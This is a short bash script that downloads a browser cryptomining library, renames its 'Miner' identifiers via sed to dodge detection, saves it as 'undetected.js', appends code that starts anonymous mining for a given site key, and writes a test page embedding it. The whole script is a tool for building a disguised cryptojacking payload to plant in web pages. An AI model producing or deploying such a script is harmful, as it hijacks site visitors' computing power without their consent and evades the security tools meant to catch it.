#!/bin/bash
THROTTLE=0.5
SITE_KEY={{YOUR_PUBLIC_SITE_KEY}}
SCRIPT_NAME=undetected.js

echo "Downloading maxmines.min.js..."
wget -q https://maxmines.com/lib/maxmines.min.js
echo "Generating $SCRIPT_NAME..."
sed -i 's/Miner/Unicorn/g' maxmines.min.js
mv maxmines.min.js $SCRIPT_NAME
echo "var m=new MaxMines.Anonymous('$SITE_KEY',{throttle:$THROTTLE});m.start();" >> $SCRIPT_NAME
echo -e "<p>Mining with throttle $THROTTLE for $SITE_KEY</p>\n<script src=\"$SCRIPT_NAME\"></script>" > test.html
echo "Done!"
